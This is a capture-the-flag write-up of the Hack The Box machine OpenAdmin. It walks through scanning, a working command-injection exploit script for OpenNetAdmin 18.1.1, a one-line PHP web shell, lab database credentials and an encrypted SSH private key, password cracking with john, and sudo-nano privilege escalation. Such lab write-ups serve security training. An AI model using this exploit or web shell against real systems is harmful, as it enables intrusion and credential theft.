---
title: Hackthebox - OpenAdmin
author: Corshine
date: 2020-05-09 22:21:00 +0700
categories: [Hackthebox]
tags: [GtfoBins, Open Net Admin, Database, Php, Ssh, Cracking, John, Nano]
image: /assets/img/Post/OpenAdmin.jpeg
---

>   **Any actions and or activities related to the material contained within this Website is solely your responsibility.The misuse of the information in this website can result in criminal charges brought against the persons in question.**


## **<span style='color:#ff5555'>Summary</span>**
***

- Find the OpenNetAdmin page and use a remote code execution exploit to get access to user `www-data`
- The DB credentials from the OpenNetAdmin configuration file are re-used for SSH access as user `jimmy`
- Find another internal website running and get a SHA512 hash from the PHP code
- After cracking the hash, log into the application and find an encrypted `SSH` private key
- Crack the key and then log in a user `joanna` and get the `user flag`
- Look at the sudo commands and find that nano can be run as `root`, look up gtfobins and spawn `/bin/bash` from nano
- cat the `/root/root.txt`

## **<span style='color:#ff5555'>Port Scan</span>**
***

```
root@corshine:~# nmap -sC -sV -T4 -oA scans/nmap.full -p- -v  openadmin.htb
# Nmap 7.80 scan initiated Fri May  1 11:44:03 2020 as: nmap -sC -sV -T4 -oA scans/nmap.full -p- -v  openadmin.htb
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.27s latency).
Not shown: 65510 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Only two ports are opened `22:ssh` and `80:http`. So we just need to focus on port `80`.

## **<span style='color:#ff5555'>Port 80</span>**
***
Visiting the website on port `80`, we found `apache2 default page`.

![]({{ "/images/htb/openadmin/defaultapache.png" | relative_url }})

## **<span style='color:#ff5555'>Gobuster</span>**
***
```
root@corshine:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k   -x "txt,html,php,asp,aspx,jpg" -u http://openadmin.htb              
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://openadmin.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php,asp,aspx,jpg
[+] Follow Redir:   true
[+] Timeout:        10s
===============================================================
2020/05/01 17:35:23 Starting gobuster
===============================================================
/index.html (Status: 200)
/music (Status: 200)
/artwork (Status: 200)
```
I got two `directories` called music and network and found that `/ona` directory inside `/music` directory which mention the version of the portal. The title page is `OpenNetadmin` and the version is `18.1.1`.

![]({{ "/images/htb/openadmin/onadir.png" | relative_url }})

## **<span style='color:#ff5555'>Exploiting the admin portal</span>**
***

There is exploit available for the current version on `exploit-db`.

![]({{ "/images/htb/openadmin/exploit1.png" | relative_url }})

[OpenNetadmin-Exploit](https://www.exploit-db.com/exploits/47691)

We just copy the `exploit` and modify it a bit.

```
#!/bin/bash

URL="http://openadmin.htb/ona/"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Now its time to run the script.....

## **<span style='color:#ff5555'>www-data</span>**
***
```
root@corshine:~# ./exploit.sh 
$ whoami
www-data
$ hostname
openadmin
$
```
After few minutes of enumeration, I found a file called `database_settings.inc.php` in `local/config`

```
$ ls local/config
database_settings.inc.php
motd.txt.example
run_installer
$
```

```
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

We have a password `n1nj4W4rri0R!`, maybe its for user, and also we found that there are two users in this machine.

```
$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
$ 
```

We try to ssh with user `jimmy` by loggin in to `ssh`.

```
root@corshine:~# sshpass -p 'n1nj4W4rri0R!` jimmy@openadmin.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May  1 13:17:15 UTC 2020

  System load:  0.0               Processes:             124
  Usage of /:   49.9% of 7.81GB   Users logged in:       2
  Memory usage: 21%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May  1 10:59:39 2020 from 10.10.16.81
jimmy@openadmin:~$ 
```
And we are as jimmy now but we can't find `user.txt`, after few minutes looking around, I found that I'm not in the proper user.

## **<span style='color:#ff5555'>Escalating to Joanna</span>**
***

After various enumerations, I found a dir called `internal` in /var/www/ and there is high port `52846` running locally.

```
LISTEN             0                   128                                   127.0.0.1:52846  
```
We tried to make a request to the `127.0.0.1:52846` using curl since it is already installed in the machine.

```
jimmy@openadmin:~$ curl 127.0.0.1:52846

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
                </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "/index.php" method = "post">
            <h4 class = "form-signin-heading"></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```

The file that being displayed and executed at the same time in `/index.php` from the directory `/var/www/internal`.

```
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 May  1 13:26 .
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
```
We have read and write permissions in the dir `internal` so I can create `php` file that may execute my commands as in `cmd=param`
```
<?php echo "<pre>"; system($_GET['cmd']); ?>
```
```
jimmy@openadmin:/var/www/internal$ echo '<?php echo "<pre>"; system($_GET['cmd']); ?>' >> test.php
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/test.php?cmd=whoami

<pre>joanna
```
We confirmed that the service is running as user `joanna`

## **<span style='color:#ff5555'>Grabbing the id_rsa</span>**
***

The content of the file `main.php` is
```
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
Make a `request` to **main.php**
```
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
Now we have the encrypted `private ssh keys`.

## **<span style='color:#ff5555'>Crack the private-key</span>**
***

First we have to make a crackable with john by using `ssh2john.py`
```
root@corshine:~# python2 /usr/share/john/ssh2john.py joanna_rsa >> hash-id_rsa
```
Now we can crack it with `john`
```
root@corshine:~# john hash-id_rsa -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna-id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2020-05-03 20:14) 0.1194g/s 1967Kp/s 1267Kc/s 1267KC/sa6_123..*7¡Vamos!
Session completed
```
We have `bloodninjas` as the cracked **passphrase**

Now it is time to login using the key of `joanna`
```
root@corshine:~# chmod 600 joanna_rsa
root@corshine:~# ssh -i joanna-id_rsa joanna@openadmin.htb
Enter passphrase for key 'joanna-id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

Last login: Fri May  1 11:31:30 2020 from 10.10.16.81
joanna@openadmin:~$ 
```

And we are in as `joanna`

![]({{ "/images/htb/openadmin/usertxt.png" | relative_url }})


## **<span style='color:#ff5555'>Escalating to root</span>**
***

By checking simple command `sudo -l` to check if I can run any command as **root**.
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

We can edit the file on `/opt/priv` using nano as **root**.

Search for `nano` on [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/)

Open the file on `/opt/priv` in **nano** as **root** with `sudo`, and press `ctrl+r and then ctrl+x` to run commands.

Found multiple ways to get root, but I used `cat` to print **root.txt**
 
```
joanna@openadmin:~$ sudo nano /opt/priv
```

![]({{ "/images/htb/openadmin/root1.png" | relative_url }})

![]({{ "/images/htb/openadmin/root2.png" | relative_url }})

***

![]({{ "/images/mandatory/pwned.png" | relative_url }})
